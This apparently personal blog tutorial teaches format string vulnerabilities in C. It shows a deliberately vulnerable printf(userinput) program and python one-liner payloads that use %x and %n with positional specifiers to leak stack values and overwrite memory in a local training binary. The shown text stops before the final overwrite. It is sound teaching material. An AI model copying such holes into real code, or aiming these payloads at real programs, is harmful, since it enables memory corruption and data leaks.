
<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Format String Vulnerability</title>
    <link rel="stylesheet" href="/styles.css">
    <link rel="stylesheet" href="/monokai.css">
    <link rel="stylesheet" href="/articles.css">
</head>
<body>
    <header>
        <nav>
            <ul>
                <li><a href="/index.html">Home</a></li>
                <li><a href="/articles.html">Articles</a></li>
                <li><a href="/writeups.html">Writeups</a></li>
                <li><a href="https://github.com/elswix/KL-Sunset" target="_blank">KL-Sunset</a></li>
                <li><a href="/about.html">About me</a></li>
            </ul>
        </nav>
    </header>
    <section class="hero">
        <div class="hero-content">
            <img src="/img/articles/logo9.png" alt="index-logo" class="index-logo">
            <h1>Format String Vulnerability</h1>
            <p>abusing printf() to achieve memory corruption</p>
            <a href="/articles.html" class="mainbtn" class="mainbtn">More articles</a>
        </div>
    </section>
    <section class="article-content">
        <div class="container">
            <div class="article-content-main">
                <br/><h2>Introduction</h2><br/>
<p>Today, we'll discuss a <strong>Binary Exploitation</strong> technique called <strong>Format String Vulnerability</strong>. We'll delve into how this vulnerability operates at a low level and explore how to exploit it to achieve memory overwrite.</p><br/>
<br/><h2>What is printf()?</h2><br/>
<p><code>printf()</code> is a fundamental function in the C programming language used to output formatted data to the standard output stream, typically the console. Its syntax is straightforward: you provide a format string that specifies how the data should be formatted, and then provide the actual data (arguments) to be inserted into the format placeholders.</p><br/>
<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">()</span><span class="w"> </span><span class="p">{</span><span class="w"></span>
<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">name</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"Alice"</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span><span class="kt">int</span><span class="w"> </span><span class="n">age</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">30</span><span class="p">;</span><span class="w"></span>
<span class="w">    </span>
<span class="w">    </span><span class="c1">// Example of using printf() with format specifiers</span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"Hello, %s! Your age is %d.</span><span class="se">\n</span><span class="s">"</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">age</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span>
<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"></span>
<span class="p">}</span><span class="w"></span>
</pre></div>
<p>In this example, <code>"Hello, %s! Your age is %d.\n"</code> is the format string passed to <code>printf()</code>. It contains format specifiers <code>%s</code> for strings (<code>name</code> in this case) and <code>%d</code> for integers (<code>age</code> in this case). When <code>printf()</code> executes, it replaces each specifier with the corresponding argument (<code>name</code> and <code>age</code>), resulting in the output: </p><br/>
<div class="highlight"><pre><span></span><span class="n">Hello</span><span class="p">,</span> <span class="n">Alice</span><span class="n">!</span> <span class="n">Your</span> <span class="n">age</span> <span class="ow">is</span> <span class="mf">30.</span>
</pre></div>
<p>Each format specifier you enter in <code>printf()</code> will take the next parameter you pass to it and incorporate it into the output string.</p><br/>
<br/><h2>What does this vulnerability entail?</h2><br/>
<p>A format string vulnerability is a critical software flaw. It emerges when user-input is directly used as the format string in functions such as <code>printf()</code> or <code>sprintf()</code> without adequate validation. In these functions, the format string dictates how data is printed or formatted. For example, <code>printf("Hello, %s!\n", name);</code> uses <code>%s</code> to indicate where the content of the <code>name</code> variable should be inserted.</p><br/>
<p>The vulnerability arises when an attacker can control the format string passed to such functions. Instead of a normal format specifier like <code>%s</code> for strings or <code>%d</code> for integers, an attacker can inject format specifiers (<code>%x</code>, <code>%s</code>, <code>%n</code>, etc.) into the input. These specifiers allow the attacker to read or write to arbitrary memory locations, potentially leaking sensitive information stored in the program's memory or even modifying critical program data.</p><br/>
<p>Exploitation of a format string vulnerability can have severe consequences. Attackers may use it to extract confidential information like passwords or encryption keys directly from memory. They can also manipulate program execution by overwriting important data structures or redirecting program flow, leading to crashes or unauthorized code execution.</p><br/>
<p>For example, the following program is vulnerable to a format string exploit:</p><br/>
<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="c1"> </span><span class="cp"></span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(){</span><span class="w"></span>

<span class="w">  </span><span class="kt">char</span><span class="w"> </span><span class="n">userinput</span><span class="p">[</span><span class="mi">50</span><span class="p">];</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"Please enter a string: "</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">fgets</span><span class="p">(</span><span class="n">userinput</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">userinput</span><span class="p">),</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span><span class="w"></span>

<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="s">"You have entered the following string: "</span><span class="p">);</span><span class="w"></span>
<span class="w">  </span><span class="n">printf</span><span class="p">(</span><span class="n">userinput</span><span class="p">);</span><span class="w"> </span>

<span class="w">  </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span>

<span class="p">}</span><span class="w"></span>
</pre></div>
<p>Why is this a vulnerability? When the program prompts the user for input, it subsequently prints the entered string back to the user. The issue arises because the variable where the user's input is stored is directly passed as the first parameter to <code>printf()</code>. This introduces a critical flaw because the first parameter of <code>printf()</code> is interpreted as the <strong>Format Parameter</strong>.</p><br/>
<p>The <code>printf()</code> manual explicitly warns about this issue in the BUGS section:</p><br/>
<div class="highlight"><pre><span></span><span class="n">Code</span> <span class="n">such</span> <span class="k">as</span> <span class="n">printf</span><span class="p">(</span><span class="n">foo</span><span class="p">);</span> <span class="n">often</span> <span class="n">indicates</span> <span class="n">a</span> <span class="n">bug</span><span class="p">,</span> <span class="n">since</span> <span class="n">foo</span> <span class="n">may</span> <span class="n">contain</span> <span class="n">a</span> <span class="o">%</span> <span class="n">character</span><span class="o">.</span> <span class="n">If</span> <span class="n">foo</span> <span class="n">comes</span> <span class="kn">from</span> <span class="nn">untrusted</span> <span class="n">user</span> <span class="nb">input</span><span class="p">,</span> <span class="n">it</span> <span class="n">may</span> <span class="n">contain</span> <span class="o">%</span><span class="n">n</span><span class="p">,</span>
<span class="n">causing</span> <span class="n">the</span> <span class="n">printf</span><span class="p">()</span> <span class="n">call</span> <span class="n">to</span> <span class="n">write</span> <span class="n">to</span> <span class="n">memory</span> <span class="ow">and</span> <span class="n">creating</span> <span class="n">a</span> <span class="n">security</span> <span class="n">hole</span><span class="o">.</span>
</pre></div>
<p>As mentioned, if the user enters a <code>%</code> character and the first parameter of <code>printf()</code> is a string controlled by the user, it could trigger a format string vulnerability. This vulnerability could potentially leak information from the stack and even overwrite memory if the user inserts <code>%n</code>.</p><br/>
<p>Let's put this into practice. Let's compile the previous program:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">gcc</span> <span class="n">program</span><span class="o">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">program</span> <span class="o">-</span><span class="n">m32</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="n">pie</span>
<span class="n">program</span><span class="o">.</span><span class="n">c</span><span class="p">:</span> <span class="n">In</span> <span class="n">function</span> <span class="n">‘</span><span class="n">main</span><span class="n">’</span><span class="p">:</span>
<span class="n">program</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">12</span><span class="p">:</span><span class="mi">10</span><span class="p">:</span> <span class="n">warning</span><span class="p">:</span> <span class="nb">format</span> <span class="ow">not</span> <span class="n">a</span> <span class="n">string</span> <span class="n">literal</span> <span class="ow">and</span> <span class="n">no</span> <span class="nb">format</span> <span class="n">arguments</span> <span class="p">[</span><span class="o">-</span><span class="n">Wformat</span><span class="o">-</span><span class="n">security</span><span class="p">]</span>
   <span class="mi">12</span> <span class="o">|</span>   <span class="n">printf</span><span class="p">(</span><span class="n">userinput</span><span class="p">);</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>I compiled the binary in 32-bit to make it easier to understand. I've also specified the <code>-no-pie</code> parameter so that symbols within the binary remain at fixed addresses (although it's not necessary for this example).</p><br/>
<p>As observed, the compiler warns us because we didn't provide a string to the format parameter; instead, we specified a variable which, in our case, will store data controlled by the user.</p><br/>
<p>Let's execute the binary:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">program</span>
<span class="n">Please</span> <span class="n">enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">Hello</span> <span class="n">world</span>
<span class="n">You</span> <span class="n">have</span> <span class="n">entered</span> <span class="n">the</span> <span class="n">following</span> <span class="n">string</span><span class="p">:</span> <span class="n">Hello</span> <span class="n">world</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>In principle, the program works well. The program prompts us for input and then prints the entered string back. Let's see what happens if I enter <code>%x</code> as input.</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">program</span>
<span class="n">Please</span> <span class="n">enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="o">%</span><span class="n">x</span>
<span class="n">You</span> <span class="n">have</span> <span class="n">entered</span> <span class="n">the</span> <span class="n">following</span> <span class="n">string</span><span class="p">:</span> <span class="mi">32</span>
</pre></div>
<p>WTFFFFFFFFFFF?</p><br/>
<p>Why does the program output <code>32</code> when I enter <code>%x</code>?</p><br/>
<p>Since the user input variable is used as the format parameter, <code>printf()</code> interprets <code>%x</code> as a format specifier. This causes it to print the value of the next parameter passed to <code>printf()</code> in hexadecimal format.</p><br/>
<p>But here's the catch: when <code>printf()</code> is called with only one parameter (the user input variable), additional parameters are expected to be on the stack. In 32-bit programs, parameters are passed on the stack. If there isn't another parameter explicitly passed for <code>printf()</code>, it will grab the next value on the stack regardless of whether it belongs to the <code>printf()</code> call or not.</p><br/>
<p>So in the previous example, when we entered <code>%x</code>, <code>printf()</code> interpreted it as a format specifier and expected a corresponding parameter to print. Since only one parameter (the user input) was passed to <code>printf()</code>, it looked for the next value on the stack to fulfill the <code>%x</code> format. In this case, the next value on the stack happened to be <code>0x32</code> (in hexadecimal), which <code>printf()</code> then interpreted and printed as the value to replace in the output string.</p><br/>
<p><br/></p><br/>
<br/><h3 class="note">Note</h3><br/>
<p>You might wonder why the value <code>0x32</code> (which is <code>50</code> in decimal) was the next value on the stack. Before the <code>printf()</code> call, we invoked <code>fgets()</code> to collect user input. In <code>fgets()</code>, we specified the length to read from standard input, which was the size of the buffer allocated for the <code>userinput</code> variable. Since we didn't pass any additional parameters to <code>printf()</code>, this size value remained on the stack. Therefore, <code>0x32</code> (or <code>50</code> in decimal) represents the size of the <code>userinput</code> buffer, retrieved from the stack by <code>printf()</code> as it looked for the next parameter.</p><br/>
<p><br/></p><br/>
<p>If I enter more format specifiers, it prints more values from the stack:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">program</span>
<span class="n">Please</span> <span class="n">enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="o">%</span><span class="n">x</span> <span class="o">%</span><span class="n">x</span> <span class="o">%</span><span class="n">x</span> <span class="o">%</span><span class="n">x</span> <span class="o">%</span><span class="n">x</span> <span class="o">%</span><span class="n">x</span> <span class="o">%</span><span class="n">x</span> <span class="o">%</span><span class="n">x</span>
<span class="n">You</span> <span class="n">have</span> <span class="n">entered</span> <span class="n">the</span> <span class="n">following</span> <span class="n">string</span><span class="p">:</span> <span class="mi">32</span> <span class="n">f0426620</span> <span class="mi">80491</span><span class="n">ad</span> <span class="mi">0</span> <span class="mi">0</span> <span class="mi">78250000</span> <span class="mi">20782520</span> <span class="mi">25207825</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>But how can we abuse this? This vulnerability allows us to potentially leak sensitive information from the stack. For instance, passwords or other data stored on the stack could inadvertently be revealed if they were passed as parameters to functions.</p><br/>
<br/><h3 class="note">Note</h3><br/>
<p>At the end of the article, we'll explore how the <strong>Format String Vulnerability</strong> can assist in leaking the Stack Canary, which can be crucial for bypassing binary protections during a buffer overflow exploit. I previously detailed this technique in my write-up for the HackTheBox machine named <a href="https://elswix.github.io/writeups/htb/hard/drive/drive.html">Drive</a>. However, I plan to provide another example in this article.</p><br/>
<br/><h2>Memory Overwrite</h2><br/>
<p>Leveraging a Format String Vulnerability, we can potentially trigger a memory overwrite. But how? How is it possible to overwrite memory by just leaking values from the stack?</p><br/>
<p>We could trigger a memory overwrite using the <code>%n</code> format specifier. Why? Let's refer to the manual page for this format specifier:</p><br/>
<div class="highlight"><pre><span></span><span class="n">The</span> <span class="n">number</span> <span class="n">of</span> <span class="n">characters</span> <span class="n">written</span> <span class="n">so</span> <span class="n">far</span> <span class="ow">is</span> <span class="n">stored</span> <span class="n">into</span> <span class="n">the</span> <span class="n">integer</span> <span class="n">pointed</span> <span class="n">to</span> <span class="n">by</span> <span class="n">the</span> <span class="n">corresponding</span> <span class="n">argument</span><span class="o">.</span>
</pre></div>
<p>The <code>%n</code> format specifier serves a unique purpose compared to other format specifiers. Unlike <code>%d</code> for integers or <code>%s</code> for strings, <code>%n</code> doesn't output any characters to the console or any output stream. Instead, its role is to store the number of characters printed so far into an integer pointer argument provided after the format string.</p><br/>
<p>When <code>%n</code> is encountered in the format string passed to <code>printf()</code>, it doesn't contribute any visible output. Instead, it modifies the value pointed to by the integer pointer argument with the count of characters printed up to that point. </p><br/>
<p>For example:</p><br/>
<div class="highlight"><pre><span></span><span class="kt">int</span><span class="w"> </span><span class="n">length</span><span class="p">;</span><span class="w"> </span>
<span class="n">printf</span><span class="p">(</span><span class="s">"Hello world!%n"</span><span class="p">,</span><span class="w"> </span><span class="o">&amp;</span><span class="n">length</span><span class="p">);</span><span class="w"></span>
<span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">Length: %d"</span><span class="p">,</span><span class="w"> </span><span class="n">length</span><span class="p">);</span><span class="w"></span>
</pre></div>
<p>This program defines an integer variable called <code>length</code>. Initially, <code>printf()</code> prints the string <code>Hello world!</code> and then, utilizing the <code>%n</code> format specifier, it calculates the number of characters printed before <code>%n</code> (in this case, the length of <code>Hello world!</code>) and stores this calculated value (an integer) into the memory location pointed to by <code>&amp;length</code>.</p><br/>
<p>Subsequently, another <code>printf()</code> call displays the value stored in <code>length</code>. In this instance, the value will be <code>12</code>, corresponding to the 12 characters in the <code>Hello world!</code> string printed before encountering the <code>%n</code> format specifier.</p><br/>
<p>Let's go back to our program and specify a string with <code>%n</code> at the end:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">program</span>
<span class="n">Please</span> <span class="n">enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">elswix</span><span class="o">%</span><span class="n">n</span>
<span class="n">zsh</span><span class="p">:</span> <span class="n">segmentation</span> <span class="n">fault</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>  <span class="o">./</span><span class="n">program</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>It crashed likely because it attempted to write the length of the string <code>elswix</code> into an invalid memory address, possibly <code>0x32</code>, which was the next parameter on the stack from the previous execution.</p><br/>
<p>Let's create another program to attempt memory overwriting:</p><br/>
<div class="highlight"><pre><span></span><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdio.h&gt;</span><span class="cp"></span>
<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;stdlib.h&gt;</span><span class="cp"></span>

<span class="kt">int</span><span class="w"> </span><span class="n">target</span><span class="p">;</span><span class="w"> </span>

<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(){</span><span class="w"></span>

<span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">userinput</span><span class="p">[</span><span class="mi">100</span><span class="p">];</span><span class="w"></span>
<span class="w">    </span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"Please, enter a string: "</span><span class="p">);</span><span class="w"> </span>
<span class="w">    </span><span class="n">fgets</span><span class="p">(</span><span class="n">userinput</span><span class="p">,</span><span class="w"> </span><span class="k">sizeof</span><span class="p">(</span><span class="n">userinput</span><span class="p">),</span><span class="w"> </span><span class="n">stdin</span><span class="p">);</span><span class="w"></span>

<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">"You have entered the following string: "</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="n">userinput</span><span class="p">);</span><span class="w"></span>

<span class="w">    </span><span class="k">if</span><span class="p">(</span><span class="n">target</span><span class="p">)</span><span class="w"></span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[+] Congratulations, you've successfully modified the target variable."</span><span class="p">);</span><span class="w"></span>
<span class="w">    </span><span class="k">else</span><span class="w"></span>
<span class="w">        </span><span class="n">printf</span><span class="p">(</span><span class="s">"</span><span class="se">\n</span><span class="s">[-] The target variable wasn't modified."</span><span class="p">);</span><span class="w"></span>

<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="mi">0</span><span class="p">;</span><span class="w"> </span>
<span class="p">}</span><span class="w"></span>
</pre></div>
<p>In this program, our goal is to achieve memory overwriting using the Format String Vulnerability to alter the value of a target variable, specifically a global variable.</p><br/>
<p>Before diving into the details, let's compile this binary in 32-bit mode with the <code>-no-pie</code> parameter (ignoring any warnings):</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">gcc</span> <span class="n">vulnerable</span><span class="o">.</span><span class="n">c</span> <span class="o">-</span><span class="n">o</span> <span class="n">vulnerable</span> <span class="o">-</span><span class="n">m32</span> <span class="o">-</span><span class="n">no</span><span class="o">-</span><span class="n">pie</span>
<span class="n">vulnerable</span><span class="o">.</span><span class="n">c</span><span class="p">:</span> <span class="n">In</span> <span class="n">function</span> <span class="n">‘</span><span class="n">main</span><span class="n">’</span><span class="p">:</span>
<span class="n">vulnerable</span><span class="o">.</span><span class="n">c</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span><span class="mi">16</span><span class="p">:</span> <span class="n">warning</span><span class="p">:</span> <span class="nb">format</span> <span class="ow">not</span> <span class="n">a</span> <span class="n">string</span> <span class="n">literal</span> <span class="ow">and</span> <span class="n">no</span> <span class="nb">format</span> <span class="n">arguments</span> <span class="p">[</span><span class="o">-</span><span class="n">Wformat</span><span class="o">-</span><span class="n">security</span><span class="p">]</span>
   <span class="mi">16</span> <span class="o">|</span>         <span class="n">printf</span><span class="p">(</span><span class="n">userinput</span><span class="p">);</span>
      <span class="o">|</span>                <span class="o">^~~~~~~~~</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>Let's run the binary and trigger the format string vulnerability:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">vulnerable</span>
<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="o">%</span><span class="n">x</span> <span class="o">%</span><span class="n">x</span> <span class="o">%</span><span class="n">x</span>
<span class="n">You</span> <span class="n">have</span> <span class="n">entered</span> <span class="n">the</span> <span class="n">following</span> <span class="n">string</span><span class="p">:</span> <span class="mi">64</span> <span class="n">f0826620</span> <span class="mi">80491</span><span class="n">ad</span>

<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">The</span> <span class="n">target</span> <span class="n">variable</span> <span class="n">wasn</span><span class="s1">'t modified.</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>As observed, it works. We can leak data from the stack. </p><br/>
<p>As mentioned earlier, we can achieve memory overwriting with the <code>%n</code> format specifier. The challenge lies in controlling which value appears next on the stack, as these format specifiers take the subsequent values from the stack. However, we can employ a trick: we can specify which stack position we want to access, either to replace it in the output string or to use it as a pointer (memory address) to store the length of characters printed before the <code>%n</code> format specifier.</p><br/>
<p>Imagine the following program:</p><br/>
<div class="highlight"><pre><span></span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">name</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"Joaquin"</span><span class="p">;</span><span class="w"> </span>
<span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">country</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s">"Uruguay"</span><span class="p">;</span><span class="w"></span>
<span class="n">printf</span><span class="p">(</span><span class="s">"Hello, %s! You are from %s."</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">country</span><span class="p">);</span><span class="w"></span>
</pre></div>
<p>The output will be as follows:</p><br/>
<div class="highlight"><pre><span></span><span class="n">Hello</span><span class="p">,</span> <span class="n">Joaquin</span><span class="n">!</span> <span class="n">You</span> <span class="n">are</span> <span class="kn">from</span> <span class="nn">Uruguay.</span>
</pre></div>
<p>However, you can specify which argument you want to use to replace the format specifier. For instance:</p><br/>
<div class="highlight"><pre><span></span><span class="n">printf</span><span class="p">(</span><span class="s">"Hello, %2$s! You are from %1$s."</span><span class="p">,</span><span class="w"> </span><span class="n">name</span><span class="p">,</span><span class="w"> </span><span class="n">country</span><span class="p">);</span><span class="w"></span>
</pre></div>
<p>When we specify <code>%2$s</code> as a format specifier, <code>printf()</code> will take the second parameter after the format string (which contains the format specifiers). Then, when <code>printf()</code> interprets <code>%1$s</code> as a format specifier, it will take the first parameter after the format string. Consequently, the output will be as follows:</p><br/>
<div class="highlight"><pre><span></span><span class="n">Hello</span><span class="p">,</span> <span class="n">Uruguay</span><span class="n">!</span> <span class="n">You</span> <span class="n">are</span> <span class="kn">from</span> <span class="nn">Joaquin.</span>
</pre></div>
<p>If you specify an integer larger than the number of parameters passed to <code>printf()</code>, it will access the next values on the stack. For example, if you enter <code>%3$x</code>, it will print in hexadecimal format the value stored on the stack at the third position after the format parameter.</p><br/>
<p>This capability allows us to input a memory address and then print numerous values from the stack until we locate our entered string. By determining its position on the stack, we can specify this position number with <code>%n</code> format specifier. This allows us to use <code>%n</code> to overwrite the value pointed to by that memory address with the calculated length.</p><br/>
<p>Imagine we input the address <code>0x08046201</code>. To determine its position on the stack, we can add multiple <code>%x</code> format specifiers to our input. When the format string executes, if we included enough <code>%x</code> characters, we should spot our entered address <code>0x08046201</code> somewhere in the printed values. By counting how many <code>%x</code> specifiers it takes to reach our address, we identify its exact position on the stack. For instance, if it appears at position <code>15</code>, using <code>%15$x</code> in our input should display our entered address in the output.</p><br/>
<p>Once confirmed, we can proceed to leverage <code>%n</code>. By inputting <code>%15$n</code>, <code>printf()</code> interprets this as instructing it to use the parameter at position 15 as a pointer to store the length of the printed string. Consequently, this action overwrites the value pointed to by our specified memory address (<code>0x08046201</code>) with the calculated length.</p><br/>
<p>Let's try it using the string <code>AAAA</code>. We'll attempt to locate it on the stack. To do this, I'll use Python to print many <code>%x</code> characters:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">vulnerable</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import sys; sys.stdout.buffer.write(b"AAAA" + b"</span><span class="si">%x</span><span class="s1"> "*15)'</span><span class="p">)</span>
<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">You</span> <span class="n">have</span> <span class="n">entered</span> <span class="n">the</span> <span class="n">following</span> <span class="n">string</span><span class="p">:</span> <span class="n">AAAA64</span> <span class="n">ec626620</span> <span class="mi">80491</span><span class="n">ad</span> <span class="mi">0</span> <span class="mi">1</span> <span class="mi">41414141</span> <span class="mi">25207825</span> <span class="mi">78252078</span> <span class="mi">20782520</span> <span class="mi">25207825</span> <span class="mi">78252078</span> <span class="mi">20782520</span> <span class="mi">25207825</span> <span class="mi">78252078</span> <span class="mi">20782520</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>As shown in the output, we've successfully located our string on the stack. Since we specified the hexadecimal format (<code>%x</code>), it prints the string <code>AAAA</code> in its hex representation, which is <code>41414141</code>. Notice that our string appears relatively close to the beginning of the output.</p><br/>
<p>If your string is further down in the output and manual counting becomes cumbersome, a helpful approach is to copy the entire output, replace spaces with newline characters (<code>\n</code>), and then use tools like <code>grep</code> to quickly locate the line containing the hexadecimal representation (<code>41414141</code>) of your desired string.</p><br/>
<p>For instance:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="n">echo</span> <span class="o">-</span><span class="n">n</span> <span class="s1">'AAAA64 f0226620 80491ad 0 1 41414141 25207825 78252078 20782520 25207825 78252078 20782520 25207825 78252078 20782520'</span> <span class="o">|</span> <span class="n">tr</span> <span class="s1">' '</span> <span class="s1">'</span><span class="se">\n</span><span class="s1">'</span> <span class="o">|</span> <span class="n">grep</span> <span class="o">-</span><span class="n">n</span> <span class="s1">'41414141'</span>
<span class="mi">6</span><span class="p">:</span><span class="mi">41414141</span>
</pre></div>
<p>This indicates that our desired string is located at position <code>6</code> on the stack. Therefore, if we append <code>%6$x</code> to our payload, <code>printf()</code> should print our string in its hexadecimal representation <code>41414141</code>:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">vulnerable</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import sys; sys.stdout.buffer.write(b"AAAA" + b"</span><span class="si">%x</span><span class="s1"> "*15 + b"%6$x")'</span><span class="p">)</span>
<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">You</span> <span class="n">have</span> <span class="n">entered</span> <span class="n">the</span> <span class="n">following</span> <span class="n">string</span><span class="p">:</span> <span class="n">AAAA64</span> <span class="n">efe26620</span> <span class="mi">80491</span><span class="n">ad</span> <span class="mi">0</span> <span class="mi">1</span> <span class="mi">41414141</span> <span class="mi">25207825</span> <span class="mi">78252078</span> <span class="mi">20782520</span> <span class="mi">25207825</span> <span class="mi">78252078</span> <span class="mi">20782520</span> <span class="mi">25207825</span> <span class="mi">78252078</span> <span class="mi">20782520</span> <span class="mi">41414141</span>
</pre></div>
<p>As seen, I appended the string <code>%6$x</code> at the end of my payload. This instructs <code>printf()</code> to print the value at position 6 on the stack after the format parameter, which should correspond to our desired string:</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">vulnerable</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import sys; sys.stdout.buffer.write(b"AAAA" + b"</span><span class="si">%x</span><span class="s1"> "*15 + b"%6$x")'</span><span class="p">)</span>
<span class="n">Please</span><span class="p">,</span> <span class="n">enter</span> <span class="n">a</span> <span class="n">string</span><span class="p">:</span> <span class="n">You</span> <span class="n">have</span> <span class="n">entered</span> <span class="n">the</span> <span class="n">following</span> <span class="n">string</span><span class="p">:</span> <span class="n">AAAA64</span> <span class="n">f2c26620</span> <span class="mi">80491</span><span class="n">ad</span> <span class="mi">0</span> <span class="mi">1</span> <span class="mi">41414141</span> <span class="mi">25207825</span> <span class="mi">78252078</span> <span class="mi">20782520</span> <span class="mi">25207825</span> <span class="mi">78252078</span> <span class="mi">20782520</span> <span class="mi">25207825</span> <span class="mi">78252078</span> <span class="mi">20782520</span> <span class="mi">41414141</span>

<span class="p">[</span><span class="o">-</span><span class="p">]</span> <span class="n">The</span> <span class="n">target</span> <span class="n">variable</span> <span class="n">wasn</span><span class="s1">'t modified.</span>
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>Great! It is printing our string back. What if I replace <code>%6$x</code> with <code>%6$n</code>? Let's try that out!</p><br/>
<div class="highlight"><pre><span></span><span class="nd">elswix@ubuntu$</span> <span class="o">./</span><span class="n">vulnerable</span> <span class="o">&lt;&lt;&lt;</span> <span class="n">$</span><span class="p">(</span><span class="n">python</span> <span class="o">-</span><span class="n">c</span> <span class="s1">'import sys; sys.stdout.buffer.write(b"AAAA" + b"</span><span class="si">%x</span><span class="s1"> "*15 + b"%6$n")'</span><span class="p">)</span>
<span class="n">zsh</span><span class="p">:</span> <span class="n">segmentation</span> <span class="n">fault</span> <span class="p">(</span><span class="n">core</span> <span class="n">dumped</span><span class="p">)</span>  <span class="o">./</span><span class="n">vulnerable</span> <span class="o">&lt;&lt;&lt;</span> 
<span class="nd">elswix@ubuntu$</span>
</pre></div>
<p>Of course, it crashes because the address <code>0x41414141</code> is invalid and likely points to inaccessible memory.</p><br/>
<p>Since we can overwrite memory, let's proceed to solve this challenge. The goal here is to modify the variable named <code>target</code> so that the if condition becomes true and we can solve the challenge. To achieve this, we need to replace the <code>AAAA</code> string with the address of the variable <code>target</code>.</p><br/>
